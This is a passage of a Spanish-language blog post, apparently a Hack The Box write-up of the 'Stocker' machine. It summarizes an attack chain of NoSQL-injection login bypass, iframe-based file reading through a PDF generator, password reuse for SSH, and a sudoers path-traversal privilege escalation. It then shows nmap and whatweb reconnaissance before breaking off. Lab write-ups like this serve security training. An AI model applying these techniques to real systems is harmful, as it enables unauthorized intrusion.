<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" data-mode="dark">
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Stocker - Hack The Box" />
<meta property="og:locale" content="en" />
<meta name="description" content="Stocker es una máquina Linux de dificultad media que cuenta con un sitio web que se ejecuta en el puerto 80 y que anuncia diversos muebles para el hogar. A través de la enumeración vHost, se identifica el nombre de host dev.stocker.htb y, al acceder a él, se carga una página de inicio de sesión que parece estar construida con NodeJS. Al enviar datos JSON y realizar una inyección NoSQL, se omite la página de inicio de sesión y se concede acceso a una tienda electrónica. La enumeración de esta tienda electrónica revela que, al enviar un pedido de compra, se crea un PDF que contiene detalles sobre los artículos comprados. Esta funcionalidad es vulnerable a la inyección de HTML y puede utilizarse indebidamente para leer archivos del sistema mediante el uso de iframes. A continuación, se lee el archivo index.js para obtener las credenciales de la base de datos y, debido a la reutilización de contraseñas, los usuarios pueden iniciar sesión en el sistema a través de SSH. A continuación, se pueden escalar los privilegios realizando un ataque de recorrido de ruta en un comando definido en el archivo sudoers, que contiene un comodín para ejecutar archivos JavaScript." />
<meta property="og:description" content="Stocker es una máquina Linux de dificultad media que cuenta con un sitio web que se ejecuta en el puerto 80 y que anuncia diversos muebles para el hogar. A través de la enumeración vHost, se identifica el nombre de host dev.stocker.htb y, al acceder a él, se carga una página de inicio de sesión que parece estar construida con NodeJS. Al enviar datos JSON y realizar una inyección NoSQL, se omite la página de inicio de sesión y se concede acceso a una tienda electrónica. La enumeración de esta tienda electrónica revela que, al enviar un pedido de compra, se crea un PDF que contiene detalles sobre los artículos comprados. Esta funcionalidad es vulnerable a la inyección de HTML y puede utilizarse indebidamente para leer archivos del sistema mediante el uso de iframes. A continuación, se lee el archivo index.js para obtener las credenciales de la base de datos y, debido a la reutilización de contraseñas, los usuarios pueden iniciar sesión en el sistema a través de SSH. A continuación, se pueden escalar los privilegios realizando un ataque de recorrido de ruta en un comando definido en el archivo sudoers, que contiene un comodín para ejecutar archivos JavaScript." />
<link rel="canonical" href="http://localhost:4000/posts/stocker/" />
<meta property="og:url" content="http://localhost:4000/posts/stocker/" />
<meta property="og:site_name" content="MrIncreibl3" />
<meta property="og:image" content="http://localhost:4000/assets/img/htb-writeup-stocker/stocker.png" />
<meta property="og:image:alt" content="stocker" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-10-14T00:00:00+00:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/img/htb-writeup-stocker/stocker.png" />
<meta name="twitter:image:alt" content="stocker" />
<meta property="twitter:title" content="Stocker - Hack The Box" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-10-14T00:00:00+00:00","datePublished":"2025-10-14T00:00:00+00:00","description":"Stocker es una máquina Linux de dificultad media que cuenta con un sitio web que se ejecuta en el puerto 80 y que anuncia diversos muebles para el hogar. A través de la enumeración vHost, se identifica el nombre de host dev.stocker.htb y, al acceder a él, se carga una página de inicio de sesión que parece estar construida con NodeJS. Al enviar datos JSON y realizar una inyección NoSQL, se omite la página de inicio de sesión y se concede acceso a una tienda electrónica. La enumeración de esta tienda electrónica revela que, al enviar un pedido de compra, se crea un PDF que contiene detalles sobre los artículos comprados. Esta funcionalidad es vulnerable a la inyección de HTML y puede utilizarse indebidamente para leer archivos del sistema mediante el uso de iframes. A continuación, se lee el archivo index.js para obtener las credenciales de la base de datos y, debido a la reutilización de contraseñas, los usuarios pueden iniciar sesión en el sistema a través de SSH. A continuación, se pueden escalar los privilegios realizando un ataque de recorrido de ruta en un comando definido en el archivo sudoers, que contiene un comodín para ejecutar archivos JavaScript.","headline":"Stocker - Hack The Box","image":{"alt":"stocker","url":"http://localhost:4000/assets/img/htb-writeup-stocker/stocker.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/stocker/"},"url":"http://localhost:4000/posts/stocker/"}</script>
<!-- End Jekyll SEO tag -->


  <title>Stocker - Hack The Box | MrIncreibl3
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="MrIncreibl3">
<meta name="application-name" content="MrIncreibl3">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    
      <link rel="preconnect" href="https://cdnjs.cloudflare.com" >
      <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.25.0/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/logo.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <h1 class="site-title">
      <a href="/">MrIncreibl3</a>
    </h1>
    <p class="site-subtitle fst-italic mb-0">Pentester , CTF player  HackTheBox RedTeam</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://github.com/MrIncreible3"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://twitter.com/"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['',''].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>Stocker - Hack The Box</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>Stocker - Hack The Box</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1760400000"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Oct 14, 2025
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/htb-writeup-stocker/stocker.png" class="popup img-link preview-img shimmer"><img src="/assets/img/htb-writeup-stocker/stocker.png"  alt="stocker" width="1200" height="630"  loading="lazy"></a><figcaption class="text-center pt-2 pb-2">stocker</figcaption></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://github.com/MrIncreibl3">MrIncreibl3</a>
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="2642 words"
>
  <em>14 min</em> read</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <p><a href="/assets/img/htb-writeup-stocker/stocker-logo.png" class="popup img-link right shimmer"><img src="/assets/img/htb-writeup-stocker/stocker-logo.png" alt="logo"  width="200" height="200" loading="lazy"></a>
Stocker es una máquina Linux de dificultad media que cuenta con un sitio web que se ejecuta en el puerto 80 y que anuncia diversos muebles para el hogar. A través de la enumeración vHost, se identifica el nombre de host <code class="language-plaintext highlighter-rouge">dev.stocker.htb</code> y, al acceder a él, se carga una página de inicio de sesión que parece estar construida con <code class="language-plaintext highlighter-rouge">NodeJS</code>. Al enviar datos JSON y realizar una inyección <code class="language-plaintext highlighter-rouge">NoSQL</code>, se omite la página de inicio de sesión y se concede acceso a una tienda electrónica. La enumeración de esta tienda electrónica revela que, al enviar un pedido de compra, se crea un PDF que contiene detalles sobre los artículos comprados. Esta funcionalidad es vulnerable a la inyección de HTML y puede utilizarse indebidamente para leer archivos del sistema mediante el uso de iframes. A continuación, se lee el archivo <code class="language-plaintext highlighter-rouge">index.js</code> para obtener las credenciales de la base de datos y, debido a la reutilización de contraseñas, los usuarios pueden iniciar sesión en el sistema a través de <code class="language-plaintext highlighter-rouge">SSH</code>. A continuación, se pueden escalar los privilegios realizando un ataque de recorrido de ruta en un comando definido en el archivo sudoers, que contiene un comodín para ejecutar archivos <code class="language-plaintext highlighter-rouge">JavaScript</code>.</p>

<h2 id="reconocimiento"><span class="me-2">Reconocimiento</span><a href="#reconocimiento" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="nmap"><span class="me-2">Nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-bash nolineno highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.11.196
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-29 08:43 EDT
Initiating SYN Stealth Scan at 08:43
Scanning 10.10.11.196 <span class="o">[</span>65535 ports]
Discovered open port 22/tcp on 10.10.11.196
Discovered open port 80/tcp on 10.10.11.196
Completed SYN Stealth Scan at 08:44, 17.18s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.10.11.196
Host is up, received user-set <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2024-04-29 08:43:56 EDT <span class="k">for </span>18s
Not shown: 65533 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
</pre></td></tr></tbody></table></code></div></div>

<p>Tenemos 2 puertos abiertos</p>

<div class="language-bash nolineno highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>22 -&gt; SSH
80 -&gt; HTTP
</pre></td></tr></tbody></table></code></div></div>

<h3 id="nmap-servicios-de-puertos"><span class="me-2">Nmap Servicios de Puertos</span><a href="#nmap-servicios-de-puertos" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-bash nolineno highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>nmap <span class="nt">-p22</span>,80 <span class="nt">-sCV</span> 10.10.11.196
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-29 08:48 EDT
Nmap scan report <span class="k">for </span>stocker.htb <span class="o">(</span>10.10.11.196<span class="o">)</span>
Host is up <span class="o">(</span>0.20s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e <span class="o">(</span>RSA<span class="o">)</span>
|   256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 <span class="nb">dd</span>:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Stock - Coming Soon!
|_http-generator: Eleventy v2.0.0
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</pre></td></tr></tbody></table></code></div></div>

<h3 id="tecnologias-web"><span class="me-2">Tecnologias Web</span><a href="#tecnologias-web" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-python nolineno highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">whatweb</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">11.196</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">11.196</span> <span class="p">[</span><span class="mi">301</span> <span class="n">Moved</span> <span class="n">Permanently</span><span class="p">]</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">][</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.18</span><span class="p">.</span><span class="mi">0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">11.196</span><span class="p">],</span> <span class="n">RedirectLocation</span><span class="p">[</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">stocker</span><span class="p">.</span><span class="n">htb</span><span class="p">],</span> <span class="n">Title</span><span class="p">[</span><span class="mi">301</span> <span class="n">Moved</span> <span class="n">Permanently</span><span class="p">],</span> <span class="n">nginx</span><span class="p">[</span><span class="mf">1.18</span><span class="p">.</span><span class="mi">0</span><span class="p">]</span>
</pre></td></tr></tbody></table></code></div></div>

<p>En esta fase de reconocimiento logramos ver un dominio <code class="language-plaintext highlighter-rouge">stocker.htb</code> vamos a colocarlo dentro del archivo /etc/hosts para que nos redirija la ip al dominio y poder ingresar a la web real.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s1">'10.10.11.196 stocker.htb'</span> <span class="o">&gt;&gt;</span> /etc/hosts
</pre></td></tr></tbody></table></code></div></div>

<h2 class="nolineno" id="web">Web</h2>

<p><a href="/assets/img/htb-writeup-stocker/stocker1.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-stocker/stocker1.png" alt="" loading="lazy"></a></p>

<h3 id="enumeracion-web-fuzz"><span class="me-2">Enumeracion Web Fuzz</span><a href="#enumeracion-web-fuzz" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
